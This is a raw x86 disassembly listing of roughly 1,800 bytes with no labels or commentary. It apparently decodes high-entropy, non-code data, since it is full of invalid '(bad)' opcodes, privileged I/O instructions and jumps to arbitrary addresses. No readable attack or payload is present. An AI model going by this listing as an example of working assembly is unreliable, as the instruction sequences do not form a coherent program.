  40fac9:	inc    ebp
  40faca:	iret   
  40facb:	pushf  
  40facc:	mov    BYTE PTR ds:0xdacf7fc4,ah
  40fad2:	ds jae 0x40fb41
  40fad5:	jno    0x40fa59
  40fad7:	fisubr WORD PTR [eax]
  40fad9:	or     BYTE PTR [ebx],dh
  40fadb:	xchg   ebx,eax
  40fadc:	pushf  
  40fadd:	push   esi
  40fade:	pop    edx
  40fae0:	dec    esp
  40fae1:	retf   0xb8da
  40fae4:	push   ss
  40fae5:	fmul   QWORD PTR [esi]
  40fae7:	mov    al,ds:0xcf010611
  40faec:	(bad)  
  40faed:	(bad)  [edx+0x43ba94f6]
  40faf3:	rcl    ebx,0x4
  40faf6:	ins    BYTE PTR es:[edi],dx
  40faf7:	dec    ebx
  40faf8:	loop   0x40fa8f
  40fafa:	(bad)  
  40fafc:	inc    esi
  40fafd:	mov    bh,0xa0
  40faff:	add    al,0x82
  40fb01:	ret    
  40fb02:	or     edx,ebp
  40fb04:	add    eax,0xb106db3b
  40fb09:	xor    dl,BYTE PTR [esi+0x19]
  40fb0c:	push   edi
  40fb0d:	pop    ss
  40fb0e:	adc    dl,bl
  40fb10:	ja     0x40faf4
  40fb12:	hlt    
  40fb13:	cmp    eax,0xaa90bb9b
  40fb18:	push   ebp
  40fb19:	dec    ebx
  40fb1a:	test   eax,0xcf8bb4d2
  40fb1f:	adc    ebx,DWORD PTR [ebp-0x3]
  40fb22:	adc    bh,ch
  40fb24:	call   0x3ac4c933
  40fb29:	inc    ecx
  40fb2a:	imul   edx,eax,0x11
  40fb2d:	dec    ebp
  40fb2e:	xor    BYTE PTR [ebx+ebx*4],dl
  40fb31:	jmp    0x40fad6
  40fb33:	inc    edi
  40fb34:	cmp    bl,BYTE PTR [eax-0x7e6a436e]
  40fb3a:	(bad)  
  40fb3b:	imul   edx,eax,0xffffff93
  40fb3e:	(bad)  
  40fb3f:	pusha  
  40fb40:	xchg   BYTE PTR ds:0x3430e3f3,dh
  40fb46:	icebp  
  40fb47:	fwait
  40fb48:	xchg   DWORD PTR [edi+0x14],ecx
  40fb4b:	addr16 jle 0x40fb01
  40fb4e:	or     edx,DWORD PTR [eax-0xb4f31aa]
  40fb54:	jbe    0x40fb63
  40fb56:	sub    al,0x5d
  40fb58:	iret   
  40fb59:	daa    
  40fb5a:	out    dx,al
  40fb5b:	leave  
  40fb5c:	in     al,0xc2
  40fb5e:	repz rol DWORD PTR [ecx+eiz*2],0xee
  40fb63:	repz rcr DWORD PTR [edx+0x3df45e73],0x69
  40fb6b:	pusha  
  40fb6c:	sub    edx,DWORD PTR [ecx]
  40fb6e:	jge    0x40fb5d
  40fb70:	inc    eax
  40fb71:	stos   BYTE PTR es:[edi],al
  40fb72:	mov    ch,0x76
  40fb74:	or     dh,BYTE PTR [eax+edi*4-0x75eba7dc]
  40fb7b:	sub    BYTE PTR [ecx+ebp*4-0x4e],0x16
  40fb80:	mov    ebx,0x67c2525f
  40fb85:	mov    ebx,0x2ef2eaee
  40fb8a:	mov    esi,0x2c6b2671
  40fb8f:	dec    esp
  40fb90:	scas   al,BYTE PTR es:[edi]
  40fb91:	and    ch,bh
  40fb93:	ret    
  40fb94:	in     eax,dx
  40fb95:	jmp    FWORD PTR [edx-0x29]
  40fb98:	lahf   
  40fb99:	test   DWORD PTR [eax+0x73e05986],0x1909214f
  40fba3:	popf   
  40fba4:	sbb    ecx,ebx
  40fba6:	not    DWORD PTR [esi]
  40fba8:	test   BYTE PTR [esi+0x3994d913],bl
  40fbae:	int    0xf8
  40fbb0:	push   ecx
  40fbb1:	rol    ah,cl
  40fbb3:	cmp    ah,bl
  40fbb5:	sti    
  40fbb6:	cdq    
  40fbb7:	xor    DWORD PTR [edx+eax*4],ecx
  40fbba:	cmp    ebp,DWORD PTR [edi-0x28]
  40fbbd:	ror    DWORD PTR [edx],cl
  40fbbf:	js     0x40fc2c
  40fbc1:	pop    edx
  40fbc2:	aaa    
  40fbc3:	jno    0x40fb90
  40fbc5:	fldcw  WORD PTR [esi-0x20ff768f]
  40fbcb:	dec    ebx
  40fbcc:	sar    ecx,cl
  40fbce:	push   eax
  40fbcf:	in     eax,dx
  40fbd0:	or     DWORD PTR [edx-0x438f2e4c],ebx
  40fbd6:	outs   dx,DWORD PTR ds:[esi]
  40fbd7:	add    eax,0xeeba427a
  40fbdc:	int    0xf0
  40fbde:	pop    es
  40fbdf:	mov    ds:0xe02710e0,eax
  40fbe4:	jbe    0x40fc28
  40fbe6:	inc    ebp
  40fbe7:	mov    edi,0x983351e9
  40fbec:	xlat   BYTE PTR ds:[ebx]
  40fbed:	cdq    
  40fbee:	and    BYTE PTR [eax-0x2c],dl
  40fbf1:	mov    ch,0xc1
  40fbf3:	inc    ebp
  40fbf4:	lods   eax,DWORD PTR ds:[esi]
  40fbf5:	aas    
  40fbf6:	outs   dx,BYTE PTR ds:[esi]
  40fbf7:	ins    BYTE PTR es:[edi],dx
  40fbf8:	nop
  40fbf9:	jg     0x40fc33
  40fbfb:	mov    dl,0x2c
  40fbfd:	out    dx,al
  40fbfe:	push   ebx
  40fbff:	lea    ecx,[ecx-0x6f]
  40fc02:	loopne 0x40fc18
  40fc04:	lods   eax,DWORD PTR ds:[esi]
  40fc05:	mov    dh,0x8a
  40fc07:	bound  edx,QWORD PTR [eax+edx*2-0x72]
  40fc0b:	push   ss
  40fc0c:	push   ds
  40fc0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0e:	cmp    DWORD PTR [ebx+0x22],ecx
  40fc11:	adc    BYTE PTR [esi+0x6d],dl
  40fc14:	out    0x14,eax
  40fc16:	jnp    0x40fc8d
  40fc18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc19:	push   esp
  40fc1a:	cwde   
  40fc1b:	out    dx,eax
  40fc1c:	push   eax
  40fc1d:	fidivr DWORD PTR [edx]
  40fc1f:	mov    al,0x17
  40fc21:	cdq    
  40fc22:	les    esp,FWORD PTR [ebx+0x46d78680]
  40fc28:	add    eax,0xfd3c85e5
  40fc2d:	inc    ebp
  40fc2e:	and    al,0x7d
  40fc30:	jbe    0x40fc57
  40fc32:	jp     0x40fc14
  40fc34:	jnp    0x40fc6c
  40fc36:	call   0xbfd7:0x90a58e5
  40fc3d:	jae    0x40fc49
  40fc3f:	xor    eax,0x6f6e2152
  40fc44:	pop    esi
  40fc45:	mov    dh,0xa4
  40fc47:	ss mov ebx,eax
  40fc4a:	cli    
  40fc4b:	sbb    eax,DWORD PTR [edi+0x67]
  40fc4e:	jns    0x40fc35
  40fc50:	push   ecx
  40fc51:	dec    esi
  40fc52:	test   BYTE PTR fs:[edi+0x6],0xad
  40fc57:	cs dec eax
  40fc59:	or     dl,0xdd
  40fc5c:	ds adc al,0xa6
  40fc5f:	and    ecx,DWORD PTR [ecx]
  40fc61:	cmp    BYTE PTR [eax-0x13],al
  40fc64:	gs je  0x40fcb5
  40fc67:	daa    
  40fc68:	outs   dx,DWORD PTR ds:[esi]
  40fc69:	mov    ah,0x6
  40fc6b:	pop    esi
  40fc6c:	jbe    0x40fcce
  40fc6e:	xor    DWORD PTR [ebx],ecx
  40fc70:	mov    edi,0x3f036855
  40fc75:	xchg   ebx,eax
  40fc76:	pop    eax
  40fc77:	clc    
  40fc78:	stos   DWORD PTR es:[edi],eax
  40fc79:	stos   BYTE PTR es:[edi],al
  40fc7a:	inc    esi
  40fc7b:	icebp  
  40fc7c:	ins    BYTE PTR es:[edi],dx
  40fc7d:	aam    0x7f
  40fc7f:	add    DWORD PTR [ebx],esp
  40fc81:	inc    ebp
  40fc82:	mov    dl,0x85
  40fc84:	stos   DWORD PTR es:[edi],eax
  40fc85:	test   eax,0x4935d7b1
  40fc8a:	cmp    al,0xf5
  40fc8c:	daa    
  40fc8d:	push   0x20
  40fc8f:	stc    
  40fc90:	mov    dh,0x16
  40fc92:	popf   
  40fc93:	out    dx,al
  40fc94:	jp     0x40fcce
  40fc96:	lock push edi
  40fc98:	test   BYTE PTR [edi],ch
  40fc9a:	mov    ecx,0x983c2377
  40fc9f:	mov    eax,0x42a16659
  40fca4:	adc    DWORD PTR [ebp-0x5c],esp
  40fca7:	mov    dl,0x1a
  40fca9:	push   0x52
  40fcab:	shl    BYTE PTR [ebx],0xbc
  40fcae:	add    dh,bl
  40fcb0:	xor    DWORD PTR [ebx],eax
  40fcb2:	push   esp
  40fcb3:	popa   
  40fcb4:	jnp    0x40fcb6
  40fcb6:	cmp    esp,edx
  40fcb8:	rol    DWORD PTR [edx],1
  40fcba:	fsub   QWORD PTR [esi-0x256ff2a9]
  40fcc0:	addr16 jmp ecx
  40fcc3:	or     eax,0xeb299b5d
  40fcc8:	adc    al,0x95
  40fcca:	js     0x40fc84
  40fccc:	jge    0x40fcbe
  40fcce:	in     eax,dx
  40fccf:	add    DWORD PTR [ebp*1+0x73995461],0xffffffc7
  40fcd7:	xchg   edi,eax
  40fcd8:	cmp    al,0x56
  40fcda:	jae    0x40fc84
  40fcdc:	sbb    ebx,edx
  40fcde:	outs   dx,DWORD PTR ds:[esi]
  40fcdf:	je     0x40fce9
  40fce1:	and    al,0x93
  40fce3:	or     eax,0xe5a9d8cc
  40fce8:	(bad)  
  40fce9:	mov    ds:0x91269ad9,eax
  40fcee:	stos   DWORD PTR es:[edi],eax
  40fcef:	mov    ah,0x79
  40fcf1:	inc    ecx
  40fcf2:	pop    ecx
  40fcf3:	cli    
  40fcf4:	cli    
  40fcf5:	call   0x97fb:0x856f66f5
  40fcfc:	xchg   edx,eax
  40fcfd:	jns    0x40fd1a
  40fcff:	sub    eax,0xe77b9aa1
  40fd04:	sub    ch,0x74
  40fd07:	out    0xf1,eax
  40fd09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd0a:	dec    esi
  40fd0b:	mul    DWORD PTR [esi+ecx*1+0x48]
  40fd0f:	adc    ebp,eax
  40fd11:	mov    dh,0xe9
  40fd13:	cmc    
  40fd14:	jnp    0x40fd0f
  40fd16:	stos   BYTE PTR es:[edi],al
  40fd17:	jo     0x40fcb8
  40fd19:	rol    BYTE PTR [ebx+eiz*2-0x4b],1
  40fd1d:	xchg   edx,eax
  40fd1e:	push   ecx
  40fd1f:	sti    
  40fd20:	xchg   DWORD PTR [ecx],ebp
  40fd22:	sahf   
  40fd23:	cmp    al,0x7a
  40fd25:	or     edx,DWORD PTR [esi-0x34d51f4f]
  40fd2b:	popa   
  40fd2c:	fwait
  40fd2d:	sbb    dh,dh
  40fd2f:	sbb    al,0x5e
  40fd31:	sbb    edx,ebx
  40fd33:	sbb    al,BYTE PTR [ecx-0xd]
  40fd36:	xchg   DWORD PTR [edx],esp
  40fd38:	addr16 ret 0x8cb7
  40fd3c:	pop    eax
  40fd3d:	leave  
  40fd3e:	data16 test BYTE PTR [edx+0x28],bh
  40fd42:	fs lahf 
  40fd44:	fisttp QWORD PTR [ecx]
  40fd46:	scas   al,BYTE PTR es:[edi]
  40fd47:	mov    ch,0xd0
  40fd49:	je     0x40fdbe
  40fd4b:	cdq    
  40fd4c:	inc    ebp
  40fd4d:	pop    esi
  40fd4e:	xor    BYTE PTR [ecx],dh
  40fd50:	or     DWORD PTR [ecx-0x3e],0x1c84c247
  40fd57:	mov    ah,0x4e
  40fd59:	inc    eax
  40fd5a:	pop    edi
  40fd5b:	push   ds
  40fd5c:	ror    eax,0xbc
  40fd5f:	cmp    ebx,DWORD PTR [edi]
  40fd61:	xor    dh,cl
  40fd63:	sbb    BYTE PTR [edx],bh
  40fd65:	lds    edx,FWORD PTR [eax-0x3a25a92]
  40fd6b:	push   es
  40fd6c:	fwait
  40fd6d:	jno    0x40fd63
  40fd6f:	cld    
  40fd70:	push   esp
  40fd71:	or     DWORD PTR [eax+ebx*8],edx
  40fd74:	out    0x7f,al
  40fd76:	sub    BYTE PTR [edx-0xb6e3ba6],dh
  40fd7c:	ins    BYTE PTR es:[edi],dx
  40fd7d:	pop    edx
  40fd7e:	add    cl,BYTE PTR gs:[edi-0x5c07d321]
  40fd85:	mov    ah,0x1c
  40fd87:	sub    DWORD PTR [ebp-0x55],edi
  40fd8a:	inc    ecx
  40fd8b:	cwde   
  40fd8c:	out    dx,eax
  40fd8d:	xor    DWORD PTR [ebp-0x18],esp
  40fd90:	pusha  
  40fd91:	scas   eax,DWORD PTR es:[edi]
  40fd92:	or     al,0x58
  40fd94:	pop    ss
  40fd95:	mov    eax,0xf70b3b78
  40fd9a:	xor    BYTE PTR [ebp+0x5b],bh
  40fd9d:	nop
  40fd9e:	cmp    ah,BYTE PTR [ecx]
  40fda0:	cwde   
  40fda1:	pop    ebx
  40fda2:	xchg   ecx,eax
  40fda3:	in     eax,0xa3
  40fda5:	add    al,0xcf
  40fda7:	(bad)  
  40fda8:	daa    
  40fda9:	dec    edx
  40fdaa:	popa   
  40fdab:	scas   al,BYTE PTR es:[edi]
  40fdac:	jmp    0xb96cbc4
  40fdb1:	add    DWORD PTR [ebx-0x46],edx
  40fdb4:	jne    0x40fd44
  40fdb6:	rol    edx,1
  40fdb8:	mov    edx,0xb742e4a9
  40fdbd:	lahf   
  40fdbe:	retf   
  40fdbf:	enter  0x345a,0x7b
  40fdc3:	mov    edx,DWORD PTR [ebx]
  40fdc5:	inc    esi
  40fdc6:	sub    eax,0xa14fea17
  40fdcb:	pop    edx
  40fdcc:	mov    ds:0xbfc35c77,eax
  40fdd1:	nop
  40fdd2:	xchg   edi,eax
  40fdd3:	fwait
  40fdd4:	shl    DWORD PTR [esi-0x26],cl
  40fdd7:	mul    DWORD PTR [ecx+0x1a669a61]
  40fddd:	add    dl,BYTE PTR [esi-0x6e043655]
  40fde3:	pop    edx
  40fde4:	pop    ss
  40fde5:	iret   
  40fde6:	sbb    al,0x86
  40fde8:	test   DWORD PTR [ebx],eax
  40fdea:	or     bl,bl
  40fdec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fded:	or     BYTE PTR [eax+0x59912d4e],0x9f
  40fdf4:	call   0xddb3:0xc3a91ddb
  40fdfb:	test   BYTE PTR [ebx],ah
  40fdfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdfe:	lds    eax,FWORD PTR [ecx-0x3c]
  40fe01:	fcomp  QWORD PTR [ebx+0x25c168df]
  40fe07:	xchg   ebx,eax
  40fe08:	jg     0x40fe42
  40fe0a:	xchg   ebp,eax
  40fe0b:	pop    eax
  40fe0c:	jg     0x40fe0c
  40fe0e:	mov    dh,BYTE PTR [edi-0x9e0cc7b]
  40fe14:	pop    ecx
  40fe16:	addr16 retf 0x5596
  40fe1a:	call   0x3ba1b3c4
  40fe1f:	test   eax,0x75cb62d
  40fe24:	cmc    
  40fe25:	mov    bh,0xd6
  40fe27:	cld    
  40fe28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe29:	xchg   DWORD PTR [edi],esp
  40fe2b:	jg     0x40fdfc
  40fe2d:	sub    dl,dh
  40fe2f:	pop    es
  40fe30:	sbb    dl,al
  40fe32:	mov    eax,ds:0xb85481c9
  40fe37:	sub    al,0x1a
  40fe39:	mov    fs,WORD PTR [ebp-0x4aab6e41]
  40fe3f:	cdq    
  40fe40:	sub    al,0xb
  40fe42:	in     eax,0xb1
  40fe44:	push   esi
  40fe45:	call   0x37e2b6e4
  40fe4a:	jae    0x40fec2
  40fe4c:	or     eax,0xd88f280e
  40fe51:	xor    eax,0x218d25cb
  40fe56:	push   ebp
  40fe57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe58:	or     ecx,esi
  40fe5a:	xchg   ebx,eax
  40fe5b:	cmc    
  40fe5c:	pop    ds
  40fe5d:	sbb    DWORD PTR [edx-0x28ed96f2],edi
  40fe63:	cwde   
  40fe64:	fldcw  WORD PTR [ebp-0x1a9def3f]
  40fe6a:	arpl   WORD PTR [ebx+0x65],bp
  40fe6d:	mov    al,0x2c
  40fe6f:	data16 or al,0xe5
  40fe72:	mov    dh,0xfb
  40fe74:	imul   esp,DWORD PTR [ebx],0x7119f1d
  40fe7a:	clc    
  40fe7b:	mov    al,ds:0x7ade7c0
  40fe80:	js     0x40fe95
  40fe82:	ret    0xac20
  40fe85:	mov    edx,0x91bb4e56
  40fe8a:	int3   
  40fe8b:	mov    ?,WORD PTR [ecx-0x5b0f7632]
  40fe91:	push   ds
  40fe92:	bound  esi,QWORD PTR [edi-0x5]
  40fe95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe96:	or     ecx,0x93fb93b1
  40fe9c:	push   0x50c4ce1b
  40fea1:	repz mov ch,0xff
  40fea4:	adc    DWORD PTR [ebp-0x1e],0xffffffe6
  40fea8:	shl    DWORD PTR [esi+0x6e],cl
  40feab:	add    esi,ebp
  40fead:	lea    ebx,[ebx-0x3ef21d8]
  40feb3:	dec    ebx
  40feb4:	dec    edi
  40feb5:	in     al,dx
  40feb6:	je     0x40fe3c
  40feb8:	rol    BYTE PTR [eax+0x52],0xaa
  40febc:	pop    esp
  40febd:	jb     0x40feb3
  40febf:	cld    
  40fec0:	ds mov ebx,edx
  40fec3:	mov    edx,0x95ce6806
  40fec8:	or     DWORD PTR [edx-0x2d10c7b0],edx
  40fece:	dec    ecx
  40fecf:	mov    dh,0xeb
  40fed1:	fnstenv [ebp+0x56]
  40fed4:	jne    0x40ff55
  40fed6:	pop    ecx
  40fed7:	call   0x1855:0x5a20f231
  40fede:	mov    eax,ds:0xceea11ca
  40fee3:	inc    ebx
  40fee4:	push   edi
  40fee5:	shr    BYTE PTR [edx+0x50],cl
  40fee8:	out    dx,al
  40fee9:	jecxz  0x40ff18
  40feeb:	push   eax
  40feec:	cmp    bh,BYTE PTR ds:0x82e9d9a7
  40fef2:	fist   WORD PTR [eax+0x3615f607]
  40fef8:	into   
  40fef9:	mov    ebx,0x75f81c0f
  40fefe:	inc    ebx
  40feff:	push   esp
  40ff00:	fcomi  st,st(3)
  40ff02:	or     al,0xc3
  40ff04:	cs mov ebx,0x42c121f9
  40ff0a:	sub    DWORD PTR [ebx+0x3bb370b5],0xa6c38a30
  40ff14:	mov    esp,0xf4f5bf58
  40ff19:	scas   eax,DWORD PTR es:[edi]
  40ff1a:	ficomp WORD PTR [edx-0x1e42bee0]
  40ff20:	lahf   
  40ff21:	in     eax,dx
  40ff22:	int    0x1a
  40ff24:	dec    edi
  40ff25:	pushf  
  40ff26:	push   ds
  40ff27:	pop    esi
  40ff28:	or     al,BYTE PTR [edi-0x7eddeaec]
  40ff2e:	retf   0x8016
  40ff31:	faddp  st(5),st
  40ff33:	add    eax,0xd067db28
  40ff38:	ret    0x426
  40ff3b:	imul   ebp,ebx,0x8d991cb9
  40ff41:	sbb    al,0x3f
  40ff43:	mov    bl,BYTE PTR [ebx+edi*4]
  40ff46:	push   cs
  40ff47:	call   0x3b70:0xb9518c49
  40ff4e:	dec    esp
  40ff4f:	ret    0x2589
  40ff52:	xchg   ecx,eax
  40ff53:	push   0xaa5ca71
  40ff58:	je     0x40ff15
  40ff5a:	dec    esi
  40ff5b:	ret    0x4fc9
  40ff5e:	mov    eax,0x2055bb95
  40ff63:	out    dx,al
  40ff64:	pop    ebp
  40ff65:	int    0xbd
  40ff67:	into   
  40ff68:	stos   BYTE PTR es:[edi],al
  40ff69:	call   0x7cb95821
  40ff6e:	jmp    0xe908:0xac67487d
  40ff75:	cli    
  40ff76:	sub    esi,DWORD PTR [ebp-0x771d6344]
  40ff7c:	xor    DWORD PTR [ecx],eax
  40ff7e:	xlat   BYTE PTR ds:[ebx]
  40ff7f:	push   edi
  40ff80:	xchg   ax,ax
  40ff82:	aad    0x4f
  40ff84:	aaa    
  40ff85:	inc    ebp
  40ff86:	je     0x40ffd3
  40ff88:	mov    al,0x3a
  40ff8a:	adc    eax,0x1ed18dc3
  40ff8f:	dec    ebp
  40ff90:	data16 sbb al,0x0
  40ff93:	daa    
  40ff94:	jnp    0x40ff43
  40ff96:	imul   esi,eax,0xdc289d
  40ff9c:	pop    eax
  40ff9d:	fbld   TBYTE PTR fs:[edi+0x572f50d4]
  40ffa4:	sbb    eax,DWORD PTR [ebx-0x30]
  40ffa7:	daa    
  40ffa8:	sub    BYTE PTR [ebp+0x35642a9a],cl
  40ffae:	mov    esi,0xc5222f11
  40ffb3:	sub    BYTE PTR [eax+0x30597f23],ch
  40ffb9:	(bad)  
  40ffba:	push   ebx
  40ffbb:	cmp    al,al
  40ffbd:	(bad)  
  40ffbe:	fcomp  DWORD PTR [edx+ebx*8-0x16]
  40ffc2:	outs   dx,BYTE PTR ds:[esi]
  40ffc3:	(bad)  
  40ffc4:	jmp    0x40ffb5
  40ffc6:	addr16 mov bl,0xef
  40ffc9:	mov    BYTE PTR [edx],ah
  40ffcb:	outs   dx,DWORD PTR ds:[esi]
  40ffcc:	addr16 push ebp
  40ffce:	cmp    eax,0xe66fd2da
  40ffd3:	sub    dl,bh
  40ffd5:	repnz xchg ebp,eax
  40ffd7:	jle    0x40ffbc
  40ffd9:	clc    
  40ffda:	inc    edi
  40ffdb:	and    al,ah
  40ffdd:	popa   
  40ffde:	pop    esp
  40ffe0:	shr    DWORD PTR [ebx],1
  40ffe2:	stc    
  40ffe3:	clc    
  40ffe4:	dec    edx
  40ffe5:	movd   DWORD PTR [eax+0x202cbe68],mm2
  40ffec:	push   ss
  40ffed:	pop    edx
  40ffee:	icebp  
  40ffef:	cmp    al,0xb9
  40fff1:	test   al,0x93
  40fff3:	jae    0x40ffc3
  40fff5:	pushf  
  40fff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fff7:	pushf  
  40fff8:	je     0x40ff87
  40fffa:	sbb    BYTE PTR [ebx-0x73987bb1],0x41
  410001:	cmp    DWORD PTR [ebx],0x39
  410004:	bound  esp,QWORD PTR [ebp+0x38]
  410007:	popf   
  410008:	mov    dl,BYTE PTR [ebp-0x1dea0bce]
  41000e:	push   0x5234b8
  410013:	dec    ecx
  410014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410015:	push   cs
  410016:	int    0x66
  410018:	add    al,0xb5
  41001a:	xchg   edx,eax
  41001b:	inc    esp
  41001c:	pop    ecx
  41001d:	fs scas al,BYTE PTR es:[edi]
  41001f:	mov    ch,0xd9
  410021:	mov    ecx,0x8d9e5b32
  410026:	jge    0x410002
  410028:	cmp    BYTE PTR [ecx],0x96
  41002b:	xor    dl,bl
  41002d:	aam    0x12
  41002f:	cmp    DWORD PTR [edi*1+0x567dcfd],ebx
  410036:	cmp    esi,ebx
  410038:	push   es
  410039:	(bad)  
  41003b:	icebp  
  41003c:	addr16 es jns 0x410057
  410040:	mov    dl,0x42
  410042:	or     al,0x7e
  410044:	pop    esp
  410045:	push   ss
  410046:	pop    ss
  410047:	xor    al,BYTE PTR [esi-0x6e0325ac]
  41004d:	stos   DWORD PTR es:[edi],eax
  41004e:	push   ebp
  41004f:	sbb    eax,0x527ba664
  410054:	xchg   esp,eax
  410055:	sahf   
  410056:	mov    ds:0xb65d479e,eax
  41005b:	ret    
  41005c:	or     BYTE PTR [esi-0x6b],al
  41005f:	shl    BYTE PTR [ecx-0x22],cl
  410062:	enter  0xdc91,0xd8
  410066:	push   esi
  410067:	or     DWORD PTR ds:0xefd8cfcc,0x5b141919
  410071:	push   edi
  410072:	ret    
  410073:	inc    edx
  410074:	xchg   ebx,eax
  410075:	add    DWORD PTR ds:0xc2bc401b,0x8870dc70
  41007f:	mov    WORD PTR [edi-0x58],?
  410082:	xchg   ebp,eax
  410083:	sbb    ebp,DWORD PTR [eax-0x63]
  410086:	mov    dl,dh
  410088:	int3   
  410089:	iret   
  41008a:	push   esp
  41008b:	and    eax,0xeaa5cc17
  410090:	push   esp
  410091:	(bad)  
  410092:	sbb    DWORD PTR [eax-0x17ddbdc9],edi
  410098:	cld    
  410099:	push   0xdca7928c
  41009e:	push   edx
  41009f:	popa   
  4100a0:	(bad)  
  4100a1:	test   al,0xb1
  4100a3:	sti    
  4100a4:	aas    
  4100a5:	mov    eax,ds:0x731aba24
  4100aa:	lea    eax,[esi+0x484ab1b0]
  4100b0:	mov    eax,DWORD PTR [esi+edi*4-0x4db52550]
  4100b7:	and    ecx,DWORD PTR [esi+0x4a0ca5f2]
  4100bd:	push   0xbec0d221
  4100c2:	(bad)  
  4100c3:	je     0x41007a
  4100c5:	(bad)  
  4100c6:	retf   
  4100c7:	das    
  4100c8:	or     dh,dl
  4100ca:	mov    edx,0x1abc73f
  4100cf:	out    0x30,al
  4100d1:	xchg   esp,eax
  4100d2:	sbb    eax,0x28cf05b5
  4100d7:	sbb    DWORD PTR [eax+eax*1+0x2bb14097],eax
  4100de:	pop    ss
  4100df:	and    al,0x17
  4100e1:	in     eax,0xc9
  4100e3:	pop    ebx
  4100e4:	stc    
  4100e5:	cli    
  4100e6:	mov    bl,0x5b
  4100e8:	shl    dl,0x90
  4100eb:	mov    dl,0x56
  4100ed:	xor    eax,0xb5dea89d
  4100f2:	(bad)  
  4100f3:	outs   dx,DWORD PTR ds:[esi]
  4100f4:	jae    0x410082
  4100f6:	fucomi st,st(6)
  4100f8:	push   DWORD PTR [ebx+0x35]
  4100fb:	ror    esp,cl
  4100fd:	rcr    bh,1
  4100ff:	mov    cl,bh
  410101:	dec    edi
  410102:	outs   dx,BYTE PTR ds:[esi]
  410103:	cmp    al,0xe9
  410105:	mov    al,ds:0xb80f4395
  41010a:	adc    ebx,ebx
  41010c:	push   edi
  41010d:	sub    ecx,edi
  41010f:	pop    ss
  410110:	sbb    al,0xae
  410112:	call   0xc335:0x107b5638
  410119:	enter  0x7067,0xe6
  41011d:	and    DWORD PTR [ebp+0x5f742ece],ebx
  410123:	pop    esp
  410124:	clc    
  410125:	repz cmp al,0xc
  410128:	aas    
  410129:	sub    al,BYTE PTR [eax+0x43c1ef24]
  41012f:	imul   esi,esi,0x2f53c7f1
  410135:	out    0xf6,al
  410137:	or     al,0x48
  410139:	sahf   
  41013a:	mov    al,0xf4
  41013c:	out    dx,eax
  41013d:	in     al,dx
  41013e:	mov    ebp,0x400b0bfd
  410143:	mov    bh,dl
  410145:	in     eax,0x18
  410147:	or     eax,0xdf90d929
  41014c:	je     0x410131
  41014e:	mov    dl,0x9e
  410150:	ret    0x8d28
  410153:	push   eax
  410154:	xchg   edi,eax
  410155:	mov    eax,fs
  410157:	shl    BYTE PTR [eax+0x7ba43346],0xed
  41015e:	xlat   BYTE PTR ds:[ebx]
  41015f:	xchg   ecx,eax
  410160:	loopne 0x4101a9
  410162:	or     DWORD PTR [ebx-0x4bc52d3c],eax
  410168:	sbb    BYTE PTR [ecx-0x57],bh
  41016b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41016c:	sti    
  41016d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41016e:	mov    ds:0x7d2b5a3c,al
  410173:	and    BYTE PTR [eax],0xad
  410176:	dec    esi
  410177:	mov    DWORD PTR [ecx+eax*4-0x42],edx
  41017b:	cmp    DWORD PTR [esi+0x5a180c7a],edi
  410181:	jb     0x4101ef
  410183:	sbb    al,0x47
  410185:	(bad)  
  410186:	retf   0x3094
  410189:	mov    DWORD PTR gs:[esi+0x538d332],ebx
  410190:	fisub  DWORD PTR [ebx-0x4f]
  410193:	inc    ecx
  410194:	cmp    eax,0xe6750ff6
  410199:	xchg   edi,eax
  41019a:	shl    cl,cl
  41019c:	test   eax,0xdae292ec
  4101a1:	push   edi
  4101a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101a3:	push   esp
  4101a4:	ret    
  4101a5:	pop    ss
  4101a6:	mov    esp,0x3bd659c7
  4101ab:	cmp    DWORD PTR [edx+0x2e],0x1a
  4101af:	(bad)  
  4101b0:	in     eax,dx
  4101b1:	loope  0x410147
  4101b3:	dec    esi
  4101b4:	mov    cl,BYTE PTR [esi+0x35428898]
  4101ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101bb:	inc    ecx
  4101bc:	add    bh,BYTE PTR [ebx]
  4101be:	xchg   edi,eax
  4101bf:	xchg   esp,eax
  4101c0:	je     0x41021e
  4101c2:	fild   WORD PTR cs:[esi+0x3c29d397]
  4101c9:	lods   al,BYTE PTR ds:[esi]
  4101ca:	jl     0x4101f1
  4101cc:	div    ecx
  4101ce:	stos   BYTE PTR es:[edi],al
  4101cf:	mov    eax,ds:0xffc931a4
  4101d4:	adc    bl,BYTE PTR ds:0x9825c935
  4101da:	add    eax,0x8af8192
  4101df:	retf   
  4101e0:	jmp    0x4101a6
  4101e2:	push   cs
  4101e3:	pop    esp
  4101e4:	jmp    0x9ff5:0x18152061
  4101eb:	inc    eax
  4101ec:	(bad)  
  4101ed:	aad    0x62
  4101ef:	(bad)  
  4101f0:	inc    ecx
  4101f2:	mov    cl,0x51
  4101f4:	adc    DWORD PTR [ebp+0x62],esp
  4101f7:	jp     0x4101d6
  4101f9:	mov    ebp,0x6aa0839c
  4101fe:	in     al,0x45
  410200:	xchg   ebp,eax
  410201:	loop   0x41018b
  410203:	fimul  DWORD PTR [ecx-0x2f9ae0ba]
  41020a:	stos   DWORD PTR es:[edi],eax
  41020b:	xlat   BYTE PTR ds:[ebx]
  41020c:	das    
  41020d:	mov    esi,0x2747f70d
  410212:	lock mov esi,DWORD PTR [esi+0xc]
  410216:	jns    0x4101b4
  410218:	xor    bh,dl
  41021a:	lahf   
  41021b:	lahf   
  41021c:	int    0x9c
  41021e:	js     0x410283
  410220:	int    0x6b
  410222:	pop    ss
  410223:	xchg   BYTE PTR [eax+0x26],bh
  410226:	mov    ds:0xbe8cde75,al
  41022b:	pop    edi
  41022c:	pushf  
  41022d:	mov    eax,0xc6358501
